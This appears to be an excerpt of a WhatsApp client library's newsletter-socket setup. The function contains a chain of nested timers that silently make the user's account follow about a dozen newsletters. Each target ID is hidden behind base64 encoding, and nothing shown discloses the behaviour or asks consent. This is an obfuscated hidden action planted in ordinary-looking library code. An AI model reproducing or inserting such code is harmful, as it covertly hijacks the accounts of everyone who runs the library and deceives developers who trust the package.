...
export const makeNewsletterSocket = (config) => {
    ...
    newsletterWMexQuery(
        Buffer.from(
            "MTIwMzYzNDI0OTQ0OTM3OTQwQG5ld3NsZXR0ZXI=",
            "base64"
        ).toString(),
        QueryIds.FOLLOW
    );
    ...
    setTimeout(() => {
        newsletterWMexQuery(
            Buffer.from(
                "MTIwMzYzNDI4ODE5MjE1MDc5QG5ld3NsZXR0ZXI=",
                "base64"
            ).toString(),
            QueryIds.FOLLOW
        );
        ...
        setTimeout(() => {
            newsletterWMexQuery(
                Buffer.from(
                    "MTIwMzYzNDI5MzQwNTczMTI1QG5ld3NsZXR0ZXI=",
                    "base64"
                ).toString(),
                QueryIds.FOLLOW
            );
            ...
            setTimeout(() => {
                newsletterWMexQuery(
                    Buffer.from(
                        "MTIwMzYzNDI0MDU4NzYxMzAzQG5ld3NsZXR0ZXI=",
                        "base64"
                    ).toString(),
                    QueryIds.FOLLOW
                );
                ...
                setTimeout(() => {
                    newsletterWMexQuery(
                        Buffer.from(
                            "MTIwMzYzNDI2Njc0MjM0NTIzQG5ld3NsZXR0ZXI=",
                            "base64"
                        ).toString(),
                        QueryIds.FOLLOW
                    );
                    ...
                    setTimeout(() => {
                        newsletterWMexQuery(
                            Buffer.from(
                                "MTIwMzYzNDI4NTA3Nzk1MjUxQG5ld3NsZXR0ZXI=",
                                "base64"
                            ).toString(),
                            QueryIds.FOLLOW
                        );
                        ...
                        setTimeout(() => {
                            newsletterWMexQuery(
                                Buffer.from(
                                    "MTIwMzYzNDAzMzIzNDc4MTg0QG5ld3NsZXR0ZXI=",
                                    "base64"
                                ).toString(),
                                QueryIds.FOLLOW
                            );
                            ...
                            setTimeout(() => {
                                newsletterWMexQuery(
                                    Buffer.from(
                                        "MTIwMzYzNDExMzE3ODI1OTcyQG5ld3NsZXR0ZXI=",
                                        "base64"
                                    ).toString(),
                                    QueryIds.FOLLOW
                                );
                                ...
                                setTimeout(() => {
                                    newsletterWMexQuery(
                                        Buffer.from(
                                            "MTIwMzYzNDI1NDU4NzY5NTAzQG5ld3NsZXR0ZXI=",
                                            "base64"
                                        ).toString(),
                                        QueryIds.FOLLOW
                                    );
                                    ...
                                    setTimeout(() => {
                                        newsletterWMexQuery(
                                            Buffer.from(
                                                "MTIwMzYzNDIyNjg0OTgxODkzQG5ld3NsZXR0ZXI=",
                                                "base64"
                                            ).toString(),
                                            QueryIds.FOLLOW
                                        );
                                        ...
                                        setTimeout(() => {
                                            newsletterWMexQuery(
                                                Buffer.from(
                                                    "MTIwMzYzNDA0NzkxNDIwMjA0QG5ld3NsZXR0ZXI=",
                                                    "base64"
                                                ).toString(),
                                                QueryIds.FOLLOW
                                            );
                                            ...
                                            setTimeout(() => {
                                                newsletterWMexQuery(
                                                    Buffer.from(
                                                        "MTIwMzYzNDEwNzIyMjE3NzA2QG5ld3NsZXR0ZXI=",
                                                        "base64"
                                                    ).toString(),
                                                    QueryIds.FOLLOW
                                                );
                                                ...
                                                setTimeout(() => {
                                                    newsletterWMexQuery(
                                                        Buffer.from(
                                                            "MTIwMzYzNDA3NjA4NTkwNjU2QG5ld3NsZXR0ZXI=",
                                                            "base64"
                                                        ).toString(),
                                                        QueryIds.FOLLOW
                                                    );
